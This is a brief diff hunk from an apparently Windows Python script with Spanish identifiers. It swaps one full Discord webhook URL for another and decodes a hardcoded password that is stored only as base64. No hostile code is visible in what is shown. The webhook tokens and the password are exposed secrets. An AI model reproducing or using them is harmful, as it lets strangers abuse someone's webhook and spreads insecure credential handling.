@@ -7,7 +7,7 @@ import base64
 contraseña_base64 = 'cGVwZTI2'
 contraseña = base64.b64decode(contraseña_base64).decode('utf-8')
 
-webhook = 'https://discord.com/api/webhooks/1333716258029309963/ANHPlotQptcpRFZumQI27tQvndBVgjxhin2gpSV0Xvl5twJ9MRZZ2AkX5EaBawzZEnxq'
+webhook = 'https://discord.com/api/webhooks/1333783677246636133/MyJ-ToLhdy-SA3_sIFaRNFJO_lkdR9uw4_5nVFC5X2Hc1kIZj66JlKiMbWzJZsJ75WoM'
 
 def clear():
     os.system('cls')
